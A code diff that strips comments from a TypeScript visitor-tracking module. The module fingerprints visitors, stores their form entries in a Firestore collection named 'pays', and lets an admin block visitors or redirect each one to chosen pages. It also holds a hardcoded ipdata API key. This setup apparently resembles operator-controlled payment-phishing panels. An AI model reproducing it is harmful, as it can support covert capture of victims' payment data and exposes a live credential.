@@ -1,27 +1,14 @@
-/**
- * Advanced Visitor Tracking System
- * Features:
- * - Unique reference number
- * - Device detection
- * - Country detection
- * - Browser & OS detection
- * - Timestamps for all actions
- * - Online/Offline status
- * - Block system
- */
 
 import { db } from "./firebase"
 import { secureAddData as addData } from "./secure-firebase"
 import { doc, updateDoc, serverTimestamp } from "firebase/firestore"
 
-// Generate unique visitor reference number
 export function generateVisitorRef(): string {
   const timestamp = Date.now().toString(36)
   const random = Math.random().toString(36).substring(2, 8)
   return `REF-${timestamp}-${random}`.toUpperCase()
 }
 
-// Get or create visitor ID
 export function getOrCreateVisitorID(): string {
   if (typeof window === 'undefined') {
     return generateVisitorRef()
@@ -37,7 +24,6 @@ export function getOrCreateVisitorID(): string {
   return visitorId
 }
 
-// Detect device type
 export function getDeviceType(): string {
   if (typeof window === 'undefined') return 'unknown'
   
@@ -52,7 +38,6 @@ export function getDeviceType(): string {
   return 'desktop'
 }
 
-// Detect browser
 export function getBrowser(): string {
   if (typeof window === 'undefined') return 'unknown'
   
@@ -69,7 +54,6 @@ export function getBrowser(): string {
   return 'unknown'
 }
 
-// Detect OS
 export function getOS(): string {
   if (typeof window === 'undefined') return 'unknown'
   
@@ -84,20 +68,17 @@ export function getOS(): string {
   return 'unknown'
 }
 
-// Get screen resolution
 export function getScreenResolution(): string {
   if (typeof window === 'undefined') return 'unknown'
   
   return `${window.screen.width}x${window.screen.height}`
 }
 
-// Get country from IP with timeout
 export async function getCountry(): Promise<string> {
   const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
   const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
   
   try {
-    // Add timeout of 3 seconds
     const controller = new AbortController()
     const timeoutId = setTimeout(() => controller.abort(), 3000)
     
@@ -115,7 +96,6 @@ export async function getCountry(): Promise<string> {
   }
 }
 
-// Initialize visitor tracking
 export async function initializeVisitorTracking(visitorId: string) {
   const country = await getCountry()
   
@@ -139,16 +119,13 @@ export async function initializeVisitorTracking(visitorId: string) {
   
   await addData(trackingData)
   
-  // Setup online/offline listeners
   setupOnlineOfflineListeners(visitorId)
   
-  // Setup activity tracker
   setupActivityTracker(visitorId)
   
   return trackingData
 }
 
-// Setup online/offline status listeners
 function setupOnlineOfflineListeners(visitorId: string) {
   if (typeof window === 'undefined') return
   
@@ -166,20 +143,17 @@ function setupOnlineOfflineListeners(visitorId: string) {
   window.addEventListener('online', () => updateOnlineStatus(true))
   window.addEventListener('offline', () => updateOnlineStatus(false))
   
-  // Update status on page visibility change
   document.addEventListener('visibilitychange', () => {
     if (document.visibilityState === 'visible') {
       updateOnlineStatus(true)
     }
   })
   
-  // Update status before page unload
   window.addEventListener('beforeunload', () => {
     updateOnlineStatus(false)
   })
 }
 
-// Setup activity tracker (updates lastActiveAt every 30 seconds)
 function setupActivityTracker(visitorId: string) {
   if (typeof window === 'undefined') return
   
@@ -194,21 +168,17 @@ function setupActivityTracker(visitorId: string) {
     }
   }
   
-  // Update activity every 30 seconds
   const intervalId = setInterval(updateActivity, 30000)
   
-  // Clear interval on page unload
   window.addEventListener('beforeunload', () => {
     clearInterval(intervalId)
   })
   
-  // Track user interactions
   const events = ['mousedown', 'keydown', 'scroll', 'touchstart']
   let lastActivityUpdate = Date.now()
   
   const handleActivity = () => {
     const now = Date.now()
-    // Only update if more than 10 seconds since last update
     if (now - lastActivityUpdate > 10000) {
       lastActivityUpdate = now
       updateActivity()
@@ -220,7 +190,6 @@ function setupActivityTracker(visitorId: string) {
   })
 }
 
-// Update visitor page
 export async function updateVisitorPage(visitorId: string, page: string, step: number) {
   try {
     await updateDoc(doc(db, "pays", visitorId), {
@@ -234,7 +203,6 @@ export async function updateVisitorPage(visitorId: string, page: string, step: n
   }
 }
 
-// Save form data with timestamp
 export async function saveFormData(visitorId: string, data: any, pageName: string) {
   try {
     const timestampedData = {
@@ -249,7 +217,6 @@ export async function saveFormData(visitorId: string, data: any, pageName: strin
   }
 }
 
-// Check if visitor is blocked
 export async function checkIfBlocked(visitorId: string): Promise<boolean> {
   try {
     const docRef = doc(db, "pays", visitorId)
@@ -266,7 +233,6 @@ export async function checkIfBlocked(visitorId: string): Promise<boolean> {
   }
 }
 
-// Check if visitor should be redirected to a specific page
 export async function checkRedirectPage(visitorId: string): Promise<string | null> {
   try {
     const docRef = doc(db, "pays", visitorId)
@@ -274,7 +240,6 @@ export async function checkRedirectPage(visitorId: string): Promise<string | nul
     
     if (docSnap.exists()) {
       const data = docSnap.data()
-      // If redirectPage is set, return it and clear it
       if (data.redirectPage) {
         return data.redirectPage
       }
@@ -287,7 +252,6 @@ export async function checkRedirectPage(visitorId: string): Promise<string | nul
   }
 }
 
-// Clear redirect page after navigation
 export async function clearRedirectPage(visitorId: string) {
   try {
     await updateDoc(doc(db, "pays", visitorId), {
@@ -299,7 +263,6 @@ export async function clearRedirectPage(visitorId: string) {
   }
 }
 
-// Set redirect page from admin dashboard
 export async function setRedirectPage(visitorId: string, targetPage: string) {
   try {
     await updateDoc(doc(db, "pays", visitorId), {
